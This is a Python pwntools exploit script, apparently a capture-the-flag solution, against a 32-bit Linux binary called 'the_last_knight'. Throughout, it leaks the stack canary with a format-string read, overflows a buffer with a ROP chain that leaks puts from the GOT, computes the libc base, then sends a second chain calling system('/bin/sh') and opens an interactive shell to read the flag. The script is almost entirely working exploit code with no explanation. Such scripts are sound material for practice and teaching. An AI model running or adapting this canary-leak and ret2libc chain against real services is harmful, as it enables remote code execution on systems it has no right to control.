#! /usr/bin/python2
# -*- coding: utf-8 -*-

from pwn import *
from sys import argv
from time import sleep

context(os = 'linux', arch = 'i386')
context.log_level = 'debug'

elf = ELF('./the_last_knight')
rop = ROP(elf)
libc = ELF('./libc.so.6')

if len(argv) != 3:
    r = process('./the_last_knight')
else:
    r = remote(argv[1], int(argv[2]))

fmtstr = '%97$p'

r.recvuntil("name? ")
r.sendline(fmtstr)
r.recvuntil("Hello ")

canary = r.recvn(10)
log.info('Found canary: {}'.format(canary))

canary = pack(int(canary, 16))

#rop.puts(elf.got['puts'])
rop.puts(elf.got['puts'])
#rop.fflush(elf.got['stdout'])

prelude = 'A'*256
pad = 'A'*4

payload = prelude + 'A' + canary[1:] + pad + rop.chain()

r.recvuntil('Word #1: ')
r.sendline(payload)

pad2 = 'A'*128

r.recvuntil('Word #2: ')
r.sendline(pad2)

r.recvuntil('anagrams\n')

libc_puts = u32(r.recvn(4))
log.info('Found libc_puts @ 0x{:08x}'.format(libc_puts))

r.close()

log.info('Calculating libc base')
libc_base = libc_puts - libc.symbols['puts']
log.info('Calculated libc base @ 0x{:08x}'.format(libc_base))

rop2 = ROP(elf)
system = libc_base + libc.symbols['system']
binsh = libc_base + next(libc.search('/bin/sh\x00'))

log.info('Calculated libc_system @ 0x{:08x}'.format(system))
log.info('Calculated binsh string @ 0x{:08x}'.format(binsh))

rop2.call(system, [binsh])

fmtstr = '%97$p'

sleep(3)
if len(argv) != 3:
    r = process('./the_last_knight')
else:
    r = remote(argv[1], int(argv[2]))
r.recvuntil("name? ")
r.sendline(fmtstr)
r.recvuntil("Hello ")

canary = r.recvn(10)
log.info('Found canary: {}'.format(canary))

canary = pack(int(canary, 16))

rop.puts(elf.got['puts'])

prelude = 'A'*256
pad = 'A'*4

payload = prelude + 'A' + canary[1:] + pad + rop2.chain()

r.recvuntil('Word #1: ')
r.sendline(payload)

pad2 = 'A'*128

r.recvuntil('Word #2: ')
r.sendline(pad2)

r.recvuntil('anagrams\n')

r.clean()
r.sendline('cat flag.txt')
r.interactive()

